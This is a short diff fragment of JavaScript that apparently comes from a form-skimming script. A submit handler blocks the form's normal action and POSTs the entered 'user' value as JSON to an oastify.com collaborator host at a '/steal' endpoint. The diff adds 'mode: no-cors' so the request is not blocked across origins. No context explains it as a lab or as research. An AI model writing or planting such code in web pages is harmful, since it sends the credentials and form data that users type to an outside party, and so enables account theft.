@@ -18,6 +18,7 @@
     e.preventDefault();
     fetch("https://joboi5is224xx9rpfluze1ydv41vpmka9.oastify.com/steal", {
       method: "POST",
+      mode: "no-cors",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         user: document.getElementById("user").value,
